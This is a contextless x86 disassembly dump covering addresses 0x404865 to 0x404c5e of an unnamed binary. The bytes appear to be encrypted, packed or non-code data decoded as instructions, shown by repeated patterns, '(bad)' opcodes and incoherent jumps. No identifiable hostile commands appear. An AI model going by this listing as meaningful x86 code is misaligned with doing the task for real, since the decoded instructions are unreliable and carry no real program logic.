  404865:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  40486a:	c5 bc d1 a1 a0 eb 60 	lds    0x60eba0a1(%ecx,%edx,8),%edi
  404871:	5f                   	pop    %edi
  404872:	c5 b8 d1 a1 a0 eb    	lds    -0x145f5e2f(%eax),%edi
  404878:	60                   	pusha
  404879:	5f                   	pop    %edi
  40487a:	c5 b4 d1 a1 a0 eb 60 	lds    0x60eba0a1(%ecx,%edx,8),%esi
  404881:	5f                   	pop    %edi
  404882:	c5 b0 d1 a1 a0 eb    	lds    -0x145f5e2f(%eax),%esi
  404888:	60                   	pusha
  404889:	5f                   	pop    %edi
  40488a:	c5 ac d1 a1 a0 eb 60 	lds    0x60eba0a1(%ecx,%edx,8),%ebp
  404891:	5f                   	pop    %edi
  404892:	c5 a8 d1 a1 a0 eb    	lds    -0x145f5e2f(%eax),%ebp
  404898:	60                   	pusha
  404899:	5f                   	pop    %edi
  40489a:	c5 24 d1             	lds    (%ecx,%edx,8),%esp
  40489d:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  4048a2:	c5 20                	lds    (%eax),%esp
  4048a4:	d1 a1 a0 eb 60 b5    	shll   $1,-0x4a9f1460(%ecx)
  4048aa:	2b 4c 2b a5          	sub    -0x5b(%ebx,%ebp,1),%ecx
  4048ae:	b0 b0                	mov    $0xb0,%al
  4048b0:	23 dd                	and    %ebp,%ebx
  4048b2:	ac                   	lods   %ds:(%esi),%al
  4048b3:	61                   	popa
  4048b4:	bb 20 e0 e3 80       	mov    $0x80e3e020,%ebx
  4048b9:	df f0                	fcomip %st(0),%st
  4048bb:	eb e5                	jmp    0x4048a2
  4048bd:	68 f0 48 7d 5f       	push   $0x5f7d48f0
  4048c2:	9f                   	lahf
  4048c3:	5f                   	pop    %edi
  4048c4:	fd                   	std
  4048c5:	22 ac 60 30 5f c5 1c 	and    0x1cc55f30(%eax,%eiz,2),%ch
  4048cc:	d1 a1 a0 eb 60 5f    	shll   $1,0x5f60eba0(%ecx)
  4048d2:	c5 18                	lds    (%eax),%ebx
  4048d4:	d1 a1 a0 eb 60 5f    	shll   $1,0x5f60eba0(%ecx)
  4048da:	c5 14 d1             	lds    (%ecx,%edx,8),%edx
  4048dd:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  4048e2:	c5 10                	lds    (%eax),%edx
  4048e4:	d1 a1 a0 eb 60 5f    	shll   $1,0x5f60eba0(%ecx)
  4048ea:	c5 0c d1             	lds    (%ecx,%edx,8),%ecx
  4048ed:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  4048f2:	c5 08                	lds    (%eax),%ecx
  4048f4:	d1 a1 a0 eb 60 5f    	shll   $1,0x5f60eba0(%ecx)
  4048fa:	c5 04 d1             	lds    (%ecx,%edx,8),%eax
  4048fd:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  404902:	c5 00                	lds    (%eax),%eax
  404904:	d1 a1 a0 eb 60 5f    	shll   $1,0x5f60eba0(%ecx)
  40490a:	c5 fc d1             	(bad)
  40490d:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  404912:	c5 f8 d1             	(bad)
  404915:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  40491a:	c5 f4 d1             	(bad)
  40491d:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  404922:	c5 f0 d1             	(bad)
  404925:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  40492a:	c5 ec d1             	(bad)
  40492d:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  404932:	c5 e8 d1             	(bad)
  404935:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  40493a:	c5 e4 d1             	(bad)
  40493d:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  404942:	c5 e0 d1             	(bad)
  404945:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  40494a:	c5 dc d1             	(bad)
  40494d:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  404952:	c5 d8 d1             	(bad)
  404955:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  40495a:	c5 d4 d1             	(bad)
  40495d:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  404962:	c5 d0 d1             	(bad)
  404965:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  40496a:	c5 cc d1             	(bad)
  40496d:	a1 a0 eb 60 b5       	mov    0xb560eba0,%eax
  404972:	2b 4c d3 20          	sub    0x20(%ebx,%edx,8),%ecx
  404976:	f5                   	cmc
  404977:	c8 ad 95 e0          	enter  $0x95ad,$0xe0
  40497b:	60                   	pusha
  40497c:	04 5f                	add    $0x5f,%al
  40497e:	d0 c4                	rol    $1,%ah
  404980:	29 80 9f 65 28 16    	sub    %eax,0x1628659f(%eax)
  404986:	e0 60                	loopne 0x4049e8
  404988:	d3 20                	shll   %cl,(%eax)
  40498a:	fa                   	cli
  40498b:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  404990:	08 74 d5 a0          	or     %dh,-0x60(%ebp,%edx,8)
  404994:	a0 23 89 82 8b       	mov    0x8b828923,%al
  404999:	5f                   	pop    %edi
  40499a:	9f                   	lahf
  40499b:	4b                   	dec    %ebx
  40499c:	98                   	cwtl
  40499d:	bd 63 eb 60 e3       	mov    $0xe360eb63,%ebp
  4049a2:	cd e8                	int    $0xe8
  4049a4:	56                   	push   %esi
  4049a5:	a0 a0 61 63 84       	mov    0x846361a0,%al
  4049aa:	d5 a0                	aad    $0xa0
  4049ac:	a0 71 a2 8e d2       	mov    0xd28ea271,%al
  4049b1:	64 a0 60 a0 60 b0    	mov    %fs:0xb060a060,%al
  4049b7:	a0 a0 a8 a0 60       	mov    0x60a0a8a0,%al
  4049bc:	a0 60 b0 a0 a0       	mov    0xa0a0b060,%al
  4049c1:	6b 0c c4 0e          	imul   $0xe,(%esp,%eax,8),%ecx
  4049c5:	b3 14                	mov    $0x14,%bl
  4049c7:	d2 f5                	shl    %cl,%ch
  4049c9:	d4 09                	aam    $0x9
  4049cb:	cc                   	int3
  4049cc:	13 f0                	adc    %eax,%esi
  4049ce:	d5 a0                	aad    $0xa0
  4049d0:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4049d5:	60                   	pusha
  4049d6:	a0 60 a0 f0 d5       	mov    0xd5f0a060,%al
  4049db:	a0 a0 60 a0 60       	mov    0x60a060a0,%al
  4049e0:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4049e5:	60                   	pusha
  4049e6:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4049eb:	60                   	pusha
  4049ec:	a0 02 d5 a0 a0       	mov    0xa0a0d502,%al
  4049f1:	68 a0 60 a0 6c       	push   $0x6ca060a0
  4049f6:	b0 a0                	mov    $0xa0,%al
  4049f8:	a0 c4 bd a0 a0       	mov    0xa0a0bdc4,%al
  4049fd:	d0 bd a0 a0 d4 bd    	sarb   $1,-0x422b5f60(%ebp)
  404a03:	a0 a0 d8 bd a0       	mov    0xa0bdd8a0,%al
  404a08:	a0 cc bd a0 a0       	mov    0xa0a0bdcc,%al
  404a0d:	a8 bc                	test   $0xbc,%al
  404a0f:	a0 a0 c4 bc a0       	mov    0xa0bcc4a0,%al
  404a14:	a0 00 bc a0 a0       	mov    0xa0a0bc00,%al
  404a19:	6e                   	outsb  %ds:(%esi),(%dx)
  404a1a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  404a1f:	61                   	popa
  404a20:	a0 60 a0 80 d5       	mov    0xd580a060,%al
  404a25:	a0 a0 64 a0 60       	mov    0x60a064a0,%al
  404a2a:	a0 68 f4 b3 14       	mov    0x14b3f468,%al
  404a2f:	d2 ec                	shr    %cl,%ah
  404a31:	c9                   	leave
  404a32:	13 d4                	adc    %esp,%edx
  404a34:	30 b3 f6 e4 72 d4    	xor    %dh,-0x2b8d1b0a(%ebx)
  404a3a:	a8 e3                	test   $0xe3,%al
  404a3c:	64 50                	fs push %eax
  404a3e:	88 46 87             	mov    %al,-0x79(%esi)
  404a41:	5f                   	pop    %edi
  404a42:	9f                   	lahf
  404a43:	eb 7a                	jmp    0x404abf
  404a45:	eb 90                	jmp    0x4049d7
  404a47:	93                   	xchg   %eax,%ebx
  404a48:	72 eb                	jb     0x404a35
  404a4a:	66 48                	dec    %ax
  404a4c:	59                   	pop    %ecx
  404a4d:	46                   	inc    %esi
  404a4e:	9f                   	lahf
  404a4f:	5f                   	pop    %edi
  404a50:	2b 26                	sub    (%esi),%esp
  404a52:	24 3b                	and    $0x3b,%al
  404a54:	14 6f                	adc    $0x6f,%al
  404a56:	88 86 88 5f 9f c4    	mov    %al,-0x3b60a078(%esi)
  404a5c:	2f                   	das
  404a5d:	65 a0 60 a0 60 23    	mov    %gs:0x2360a060,%al
  404a63:	24 ac                	and    $0xac,%al
  404a65:	eb 66                	jmp    0x404acd
  404a67:	be fb 23 2d a0       	mov    $0xa02d23fb,%esi
  404a6c:	a0 b5 2b 4c 23       	mov    0x234c2bb5,%al
  404a71:	24 98                	and    $0x98,%al
  404a73:	b3 f6                	mov    $0xf6,%bl
  404a75:	b7 d3                	mov    $0xd3,%bh
  404a77:	29 29                	sub    %ebp,(%ecx)
  404a79:	ad                   	lods   %ds:(%esi),%eax
  404a7a:	98                   	cwtl
  404a7b:	e9 f5 5c 2b 58       	jmp    0x586ba775
  404a80:	d3 20                	shll   %cl,(%eax)
  404a82:	f5                   	cmc
  404a83:	c8 13 96 e0          	enter  $0x9613,$0xe0
  404a87:	60                   	pusha
  404a88:	04 5f                	add    $0x5f,%al
  404a8a:	d0 c4                	rol    $1,%ah
  404a8c:	29 80 2b a7 a4 48    	sub    %eax,0x48a4a72b(%eax)
  404a92:	27                   	daa
  404a93:	58                   	pop    %eax
  404a94:	9f                   	lahf
  404a95:	5f                   	pop    %edi
  404a96:	2b 38                	sub    (%eax),%edi
  404a98:	eb e5                	jmp    0x404a7f
  404a9a:	7b dc                	jnp    0x404a78
  404a9c:	c2 a3 d3             	ret    $0xd3a3
  404a9f:	56                   	push   %esi
  404aa0:	9f                   	lahf
  404aa1:	d5 98                	aad    $0x98
  404aa3:	eb e7                	jmp    0x404a8c
  404aa5:	64 9f                	fs lahf
  404aa7:	94                   	xchg   %eax,%esp
  404aa8:	50                   	push   %eax
  404aa9:	c8 2c 96 e0          	enter  $0x962c,$0xe0
  404aad:	60                   	pusha
  404aae:	2d a5 98 1a a3       	sub    $0xa31a98a5,%eax
  404ab3:	60                   	pusha
  404ab4:	a0 60 88 5e 90       	mov    0x905e8860,%al
  404ab9:	5f                   	pop    %edi
  404aba:	9f                   	lahf
  404abb:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404abc:	eb d5                	jmp    0x404a93
  404abe:	81 ed e5 58 f0 eb    	sub    $0xebf058e5,%ebp
  404ac4:	e5 58                	in     $0x58,%eax
  404ac6:	88 8e 90 5f 9f eb    	mov    %cl,-0x1460a070(%esi)
  404acc:	68 a9 5a 61 a0       	push   $0xa0615aa9
  404ad1:	60                   	pusha
  404ad2:	a0 eb e5 58 88       	mov    0x8858e5eb,%al
  404ad7:	d2 92 5f 9f eb e5    	rclb   %cl,-0x1a1460a1(%edx)
  404add:	5c                   	pop    %esp
  404ade:	2b b5 98 48 87 4e    	sub    0x4e874898(%ebp),%esi
  404ae4:	9f                   	lahf
  404ae5:	5f                   	pop    %edi
  404ae6:	d3 20                	shll   %cl,(%eax)
  404ae8:	fa                   	cli
  404ae9:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  404aee:	08 da                	or     %bl,%dl
  404af0:	d6                   	salc
  404af1:	a0 a0 ed e5 58       	mov    0x58e5eda0,%al
  404af6:	88 de                	mov    %bl,%dh
  404af8:	8e 5f 9f             	mov    -0x61(%edi),%ds
  404afb:	23 89 1c 89 5f 9f    	and    -0x60a076e4(%ecx),%ecx
  404b01:	4b                   	dec    %ebx
  404b02:	90                   	nop
  404b03:	bf fe bb f9 b9       	mov    $0xb9f9bbfe,%edi
  404b08:	fd                   	std
  404b09:	23 a0 60 a0 5f 9f    	and    -0x60a05fa0(%eax),%esp
  404b0f:	5f                   	pop    %edi
  404b10:	9f                   	lahf
  404b11:	62 a0 60 a0 6d aa    	bound  %esp,-0x55925fa0(%eax)
  404b17:	60                   	pusha
  404b18:	a0 b5 2b 4c 0a       	mov    0xa4c2bb5,%al
  404b1d:	60                   	pusha
  404b1e:	0a 60 f3             	or     -0xd(%eax),%ah
  404b21:	b6 2b                	mov    $0x2b,%dh
  404b23:	3a 2b                	cmp    (%ebx),%ch
  404b25:	50                   	push   %eax
  404b26:	d3 20                	shll   %cl,(%eax)
  404b28:	f5                   	cmc
  404b29:	c8 ce 97 e0          	enter  $0x97ce,$0xe0
  404b2d:	60                   	pusha
  404b2e:	04 5f                	add    $0x5f,%al
  404b30:	d0 c4                	rol    $1,%ah
  404b32:	29 80 2b 26 88 26    	sub    %eax,0x2688262b(%eax)
  404b38:	a1 60 a0 e5 7b       	mov    0x7be5a060,%eax
  404b3d:	d4 fd                	aam    $0xfd
  404b3f:	ed                   	in     (%dx),%eax
  404b40:	e5 5c                	in     $0x5c,%eax
  404b42:	2b 33                	sub    (%ebx),%esi
  404b44:	88 28                	mov    %ch,(%eax)
  404b46:	8e 5f 9f             	mov    -0x61(%edi),%ds
  404b49:	eb f5                	jmp    0x404b40
  404b4b:	5c                   	pop    %esp
  404b4c:	58                   	pop    %eax
  404b4d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404b4e:	d7                   	xlat   %ds:(%ebx)
  404b4f:	a0 a0 48 1f 52       	mov    0x521f48a0,%al
  404b54:	9f                   	lahf
  404b55:	5f                   	pop    %edi
  404b56:	2b 38                	sub    (%eax),%edi
  404b58:	25 3b 14 87 2d       	and    $0x2d87143b,%eax
  404b5d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404b5e:	98                   	cwtl
  404b5f:	b0 2b                	mov    $0x2b,%al
  404b61:	2b e9                	sub    %ecx,%ebp
  404b63:	93                   	xchg   %eax,%ebx
  404b64:	72 eb                	jb     0x404b51
  404b66:	e5 5c                	in     $0x5c,%eax
  404b68:	88 40 91             	mov    %al,-0x6f(%eax)
  404b6b:	5f                   	pop    %edi
  404b6c:	9f                   	lahf
  404b6d:	ed                   	in     (%dx),%eax
  404b6e:	e5 5c                	in     $0x5c,%eax
  404b70:	f0 ed                	lock in (%dx),%eax
  404b72:	f3 62 59 5f          	repz bound %ebx,0x5f(%ecx)
  404b76:	9f                   	lahf
  404b77:	5f                   	pop    %edi
  404b78:	1f                   	pop    %ds
  404b79:	eb e5                	jmp    0x404b60
  404b7b:	5c                   	pop    %esp
  404b7c:	88 2c 91             	mov    %ch,(%ecx,%edx,4)
  404b7f:	5f                   	pop    %edi
  404b80:	9f                   	lahf
  404b81:	4b                   	dec    %ebx
  404b82:	ab                   	stos   %eax,%es:(%edi)
  404b83:	ed                   	in     (%dx),%eax
  404b84:	e5 58                	in     $0x58,%eax
  404b86:	2b b5 9c 48 23 4e    	sub    0x4e23489c(%ebp),%esi
  404b8c:	9f                   	lahf
  404b8d:	5f                   	pop    %edi
  404b8e:	2b b5 98 eb 66 48    	sub    0x4866eb98(%ebp),%esi
  404b94:	c9                   	leave
  404b95:	61                   	popa
  404b96:	a0 60 25 3b 15       	mov    0x153b2560,%al
  404b9b:	0d d3 20 fa b9       	or     $0xb9fa20d3,%eax
  404ba0:	f9                   	stc
  404ba1:	c4 29                	les    (%ecx),%ebp
  404ba3:	70 08                	jo     0x404bad
  404ba5:	95                   	xchg   %eax,%ebp
  404ba6:	d7                   	xlat   %ds:(%ebx)
  404ba7:	a0 a0 ed e5 58       	mov    0x58e5eda0,%al
  404bac:	5a                   	pop    %edx
  404bad:	62 a0 60 a0 48 87    	bound  %esp,-0x78b75fa0(%eax)
  404bb3:	4d                   	dec    %ebp
  404bb4:	9f                   	lahf
  404bb5:	5f                   	pop    %edi
  404bb6:	63 49 a1             	arpl   %ecx,-0x5f(%ecx)
  404bb9:	49                   	dec    %ecx
  404bba:	9f                   	lahf
  404bbb:	5f                   	pop    %edi
  404bbc:	8b 4b fe             	mov    -0x2(%ebx),%ecx
  404bbf:	bb f9 b9 fd 23       	mov    $0x23fdb9f9,%ebx
  404bc4:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  404bc9:	62 a0 60 a0 6d aa    	bound  %esp,-0x55925fa0(%eax)
  404bcf:	60                   	pusha
  404bd0:	a0 eb e0 64 88       	mov    0x8864e0eb,%al
  404bd5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404bd6:	97                   	xchg   %eax,%edi
  404bd7:	5f                   	pop    %edi
  404bd8:	9f                   	lahf
  404bd9:	23 2d a0 a0 b5 2b    	and    0x2bb5a0a0,%ebp
  404bdf:	4c                   	dec    %esp
  404be0:	21 24 4c             	and    %esp,(%esp,%ecx,2)
  404be3:	5e                   	pop    %esi
  404be4:	9f                   	lahf
  404be5:	5f                   	pop    %edi
  404be6:	f3 93                	repz xchg %eax,%ebx
  404be8:	69 e9 2d 0c 9e 5f    	imul   $0x5f9e0c2d,%ecx,%ebp
  404bee:	9f                   	lahf
  404bef:	e9 ed 5c 2b 38       	jmp    0x386ba8e1
  404bf4:	d3 20                	shll   %cl,(%eax)
  404bf6:	f5                   	cmc
  404bf7:	c8 c9 98 e0          	enter  $0x98c9,$0xe0
  404bfb:	60                   	pusha
  404bfc:	04 5f                	add    $0x5f,%al
  404bfe:	d0 c4                	rol    $1,%ah
  404c00:	29 80 2d e5 50 5e    	sub    %eax,0x5e50e52d(%eax)
  404c06:	9f                   	lahf
  404c07:	5f                   	pop    %edi
  404c08:	88 b4 80 5f 9f 93 60 	mov    %dh,0x60939f5f(%eax,%eax,4)
  404c0f:	b5 08                	mov    $0x8,%ch
  404c11:	61                   	popa
  404c12:	d8 a0 a0 c4 9f 90    	fsubs  -0x6f603b60(%eax)
  404c18:	04 e9                	add    $0xe9,%al
  404c1a:	c0 01 e0             	rolb   $0xe0,(%ecx)
  404c1d:	08 e0                	or     %ah,%al
  404c1f:	60                   	pusha
  404c20:	66 60                	pushaw
  404c22:	a1 1a a1 60 a0       	mov    0xa060a11a,%eax
  404c27:	60                   	pusha
  404c28:	2d e5 50 5e 9f       	sub    $0x9f5e50e5,%eax
  404c2d:	5f                   	pop    %edi
  404c2e:	88 12                	mov    %dl,(%edx)
  404c30:	83 5f 9f ed          	sbbl   $0xffffffed,-0x61(%edi)
  404c34:	35 0c 9e 5f 9f       	xor    $0x9f5f9e0c,%eax
  404c39:	eb 63                	jmp    0x404c9e
  404c3b:	48                   	dec    %eax
  404c3c:	cd 5e                	int    $0x5e
  404c3e:	9f                   	lahf
  404c3f:	5f                   	pop    %edi
  404c40:	2b e5                	sub    %ebp,%esp
  404c42:	4c                   	dec    %esp
  404c43:	5e                   	pop    %esi
  404c44:	9f                   	lahf
  404c45:	5f                   	pop    %edi
  404c46:	2d ad 9c 93 72       	sub    $0x72939cad,%eax
  404c4b:	48                   	dec    %eax
  404c4c:	9d                   	popf
  404c4d:	60                   	pusha
  404c4e:	a0 60 0a 60 2b       	mov    0x2b600a60,%al
  404c53:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404c54:	9c                   	pushf
  404c55:	48                   	dec    %eax
  404c56:	3f                   	aas
  404c57:	4e                   	dec    %esi
  404c58:	9f                   	lahf
  404c59:	5f                   	pop    %edi
  404c5a:	f0 ed                	lock in (%dx),%eax
  404c5c:	e5 5c                	in     $0x5c,%eax
  404c5e:	88 42 90             	mov    %al,-0x70(%edx)
